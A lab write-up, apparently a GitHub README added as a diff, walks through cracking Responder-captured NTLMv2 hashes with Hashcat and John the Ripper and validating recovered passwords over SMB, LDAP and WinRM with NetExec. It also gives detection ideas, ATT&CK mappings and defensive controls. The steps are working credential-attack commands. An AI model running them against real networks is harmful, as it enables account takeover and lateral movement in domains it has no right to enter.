@@ -1,0 +1,237 @@
+After capturing NTLMv2 challenge-response hashes with Responder, the next step is offline password cracking.
+
+This phase turns a captured authentication attempt into a usable credential if the password is weak enough. In an internal AD environment, that can quickly lead to:
+
+share access
+LDAP enumeration
+BloodHound collection
+remote login attempts
+privilege escalation opportunities
+Objective
+Take captured NTLMv2 hashes from Responder
+Verify the hash format
+Crack them with Hashcat
+Optionally test with John the Ripper
+Validate recovered credentials safely in the lab
+Tools Used
+Kali Linux
+Hashcat
+John the Ripper (optional)
+Responder log files
+NetExec (nxc) for credential validation
+Lab Environment
+Attacker: Kali Linux
+Target Type: Internal Active Directory lab
+Sanitized Values:
+Domain: LAB.LOCAL
+User: labuser
+Host: WORKSTATION01
+DC: DC01
+IPs: 192.168.x.x
+
+All identifiers below are sanitized for public posting.
+
+Attack Flow
+Capture NTLMv2 hash with Responder
+Extract the saved hash from the Responder logs
+Save the hash to a crack file
+Run Hashcat with the correct mode
+Recover the password (if weak)
+Validate credentials against lab services
+Step 1 – Locate the Captured Hash
+
+Responder saves captured authentication data here:
+
+ls /usr/share/responder/logs
+
+Example sanitized file names:
+
+SMB-NTLMv2-SSP-[REDACTED].txt
+HTTP-NTLMv2-[REDACTED].txt
+
+Read the file:
+
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-[REDACTED].txt
+Step 2 – Confirm the NTLMv2 Format
+
+A typical Responder NTLMv2 hash looks like this:
+
+labuser::LAB:1122334455667788:AABBCCDDEEFF00112233445566778899:0101000000000000...
+Important
+
+For NTLMv2 challenge-response, keep the line exactly as captured.
+Do not manually reformat it unless the tool specifically requires it.
+
+Step 3 – Save the Hash to a File
+
+Create a file for cracking:
+
+nano ntlmv2_hashes.txt
+
+Paste the captured line into the file, then save.
+
+Quick check:
+
+cat ntlmv2_hashes.txt
+Step 4 – Crack with Hashcat (Primary Method)
+
+For NTLMv2, the correct mode is:
+
+5600
+
+Run:
+
+hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
+Step 5 – View Cracked Results
+
+If Hashcat succeeds:
+
+hashcat -m 5600 ntlmv2_hashes.txt --show
+
+Example sanitized output:
+
+labuser::LAB:1122334455667788:AABBCCDDEEFF00112233445566778899:0101000000000000...:Password123!
+Step 6 – Optional: Use John the Ripper
+
+Alternative method:
+
+john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2_hashes.txt
+
+Show results:
+
+john --show ntlmv2_hashes.txt
+Why Hashcat Is Usually Preferred
+
+For this phase, Hashcat is usually stronger because:
+
+faster on supported hardware
+better control over rules / masks
+easier to scale later
+common in password auditing workflows
+Common Issues
+1. Wrong Hash Mode
+
+If you use the wrong mode, cracking will fail.
+
+For Responder NTLMv2, use:
+
+-m 5600
+2. Bad Hash Formatting
+
+Do not break the hash into multiple lines.
+Do not remove the :: structure.
+
+Keep the full line intact:
+
+user::DOMAIN:challenge:response:blob
+3. Empty / Invalid File
+
+Check the file:
+
+cat ntlmv2_hashes.txt
+wc -l ntlmv2_hashes.txt
+4. rockyou.txt Missing
+
+If needed:
+
+ls /usr/share/wordlists
+
+If compressed:
+
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+Step 7 – Validate Recovered Credentials
+
+Once a password is recovered, test it carefully in the lab.
+
+SMB Validation
+nxc smb 192.168.x.x -u labuser -p 'Password123!' -d LAB.LOCAL
+LDAP Validation
+nxc ldap 192.168.x.x -u labuser -p 'Password123!' -d LAB.LOCAL
+WinRM Validation (if applicable)
+nxc winrm 192.168.x.x -u labuser -p 'Password123!' -d LAB.LOCAL
+What a Successful Validation May Show
+
+Possible output:
+
+SMB  192.168.x.x  445  DC01  [+] LAB.LOCAL\labuser:Password123!
+
+This confirms:
+
+the password is valid
+the account is usable
+the credential can support the next attack stage
+Security Impact
+
+A cracked NTLMv2 hash can quickly become:
+
+valid domain credentials
+SMB share access
+LDAP enumeration access
+BloodHound data collection
+remote management testing
+a bridge into post-compromise activity
+
+This is why weak passwords make internal auth exposure far more dangerous.
+
+Detection Ideas
+
+Blue teams should watch for:
+
+unusual authentication failures followed by successful login
+suspicious SMB / LDAP enumeration shortly after credential exposure
+password spray / validation patterns
+offline cracking cannot be directly seen, but follow-on usage can
+
+Good telemetry after a crack:
+
+new SMB sessions
+unexpected LDAP binds
+unusual WinRM usage
+auth to servers the user normally does not access
+MITRE ATT&CK Mapping
+T1110.002 – Password Cracking
+T1078 – Valid Accounts
+T1021.002 – SMB/Windows Admin Shares (follow-on)
+T1087 – Account Discovery (follow-on)
+Defensive Controls
+Enforce longer passwords / passphrases
+Reduce NTLM usage where possible
+Disable LLMNR / NBT-NS to prevent initial capture
+Monitor suspicious internal authentication patterns
+Limit where standard users can authenticate
+Apply MFA where feasible for administrative workflows
+Public Posting Safety
+
+Before pushing to GitHub:
+
+redact full hashes
+hide real usernames
+replace real domains with LAB.LOCAL
+replace hostnames with DC01, WORKSTATION01
+replace IPs with 192.168.x.x
+do not post real cracked passwords from non-lab systems
+Good Public Replacements
+LAB.LOCAL
+labuser
+Password123!
+192.168.x.x
+[REDACTED_HASH]
+Recommended Repo Structure
+NTLMv2-Hash-Cracking/
+├── README.md
+├── screenshots/
+│   ├── responder-log-redacted.png
+│   ├── hashcat-run-redacted.png
+│   ├── hashcat-show-redacted.png
+│   └── nxc-validation-redacted.png
+└── notes/
+    └── commands.txt
+Command Reference
+ls /usr/share/responder/logs
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-[REDACTED].txt
+nano ntlmv2_hashes.txt
+hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 ntlmv2_hashes.txt --show
+john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2_hashes.txt
+nxc smb 192.168.x.x -u labuser -p 'Password123!' -d LAB.LOCAL
+nxc ldap 192.168.x.x -u labuser -p 'Password123!' -d LAB.LOCAL
